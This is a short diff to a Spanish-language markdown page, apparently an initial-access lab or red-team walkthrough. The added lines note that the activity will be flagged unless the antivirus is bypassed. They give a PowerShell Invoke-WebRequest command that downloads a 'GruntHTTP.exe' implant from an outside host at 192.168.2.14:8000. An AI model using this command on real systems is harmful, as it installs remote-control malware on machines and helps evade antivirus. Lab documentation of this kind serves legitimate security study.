@@ -98,7 +98,11 @@ Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
 
 ![image007.png](/uploads/InitialAccess/image007.png)
 
-Como vemos, se detecta una creación del fichero, y acto seguido una conexión.
+Debemos tener en cuenta que saltará información si no conseguimos bypassear el AV
+Para descargar el fichero utilize la expresión:
+
+Invoke-WebRequest -uri http://192.168.2.14:8000/GruntHTTP.exe -OutFile grunt.exe
+
 
 ![image008.png](/uploads/InitialAccess/image008.png)
 
